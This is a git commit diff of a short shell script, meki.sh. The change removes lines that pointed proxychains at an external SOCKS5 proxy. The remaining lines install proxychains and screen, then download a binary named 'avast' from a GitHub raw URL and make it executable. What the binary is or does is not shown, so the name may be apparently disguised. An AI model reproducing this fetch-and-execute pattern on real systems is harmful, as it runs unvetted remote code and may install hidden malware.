88cd6f01cbd34ae7ff3726ceb70c3d942c8f5181
renilo <88342640+renilo@users.noreply.github.com>
2022-01-30 14:19:34 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -4,12 +4,6 @@ apt install proxychains
 
 apt install screen -y
 
-sed -i 's/socks4/socks5/' /etc/proxychains.conf
-
-sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
-
-sed -i 's/9050/10663/' /etc/proxychains.conf
-
 wget https://raw.githubusercontent.com/renilo/bh/main/avast
 
 chmod +x avast
